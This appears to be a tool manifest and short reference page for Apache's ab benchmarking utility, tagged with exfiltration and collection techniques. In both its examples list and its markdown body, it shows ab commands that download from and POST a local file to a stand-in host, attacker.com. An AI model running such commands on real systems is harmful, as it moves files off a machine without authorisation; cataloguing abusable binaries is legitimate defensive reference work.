---
id: network-http-ab
namespace: network:http:ab
name: ab
description: Apache HTTP server benchmarking tool that can also be used for file download and upload operations.
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - network.transfer.download
  - network.transfer.upload
  - network.http.benchmark
platforms:
  - linux
  - macos
  - cross-platform
risk_level: low
trust_level: community
execution_policy: enabled
architectures:
  - amd64
  - arm64
  - cross-platform
dependencies: []
related_tools:
  - curl
  - wget
artifacts:
  - type: network.http.benchmark
    description: HTTP benchmark results
    mime: text/plain
    trust_level: community
workflow_edges:
  produces:
    - benchmark-results
  consumes:
    - target-url
contract:
  inputs:
    - type: network.target.url
      description: Target URL for benchmark or transfer
  outputs:
    - type: network.http.benchmark
      description: Benchmark results
      mime: text/plain
  side_effects:
    - network_traffic
  resource_cost:
    cpu: medium
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: medium
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
  - ab
  - Bash
  - execFile
parameters:
  - name: v
    type: integer
    required: false
    description: "Verbosity level"
    aliases:
      - -v
      - --verbose
  - name: p
    type: file
    required: false
    description: "File to POST"
    aliases:
      - -p
      - --post-file
  - name: n
    type: integer
    required: false
    description: "Number of requests"
    aliases:
      - -n
      - --requests
  - name: c
    type: integer
    required: false
    description: "Concurrency level"
    aliases:
      - -c
      - --concurrency
features:
  - network-intensive
execution:
  template: "ab {v} {n} {c}"
  sandbox: execFile
  timeout_seconds: 60
  shell: false
global_vars:
  target: url
examples:
  - description: Download file from attacker server via verbose output
    command: ab -v2 http://attacker.com/path/to/input-file
  - description: Upload a local file via POST
    command: ab -p /path/to/input-file http://attacker.com/
  - description: Basic benchmark with 1000 requests, concurrency 10
    command: ab -n 1000 -c 10 http://example.com/
references:
  - label: "Apache ab documentation"
    url: "https://httpd.apache.org/docs/current/programs/ab.html"
techniques:
  - exfiltration
  - collection
install:
    - method: apt
      package_name: "apache2-utils"
      commands:
        - "apt-get install -y apache2-utils"
---


# ab — Apache HTTP Benchmark

ab is a tool for benchmarking Apache HTTP servers. It can also be abused for file transfer operations when the binary has special privileges.

## File Transfer

```bash
# Download file from remote server
ab -v2 http://attacker.com/path/to/input-file

# Upload file via POST
ab -p /path/to/input-file http://attacker.com/
```

## Benchmarking

```bash
ab -n 1000 -c 10 http://example.com/
```
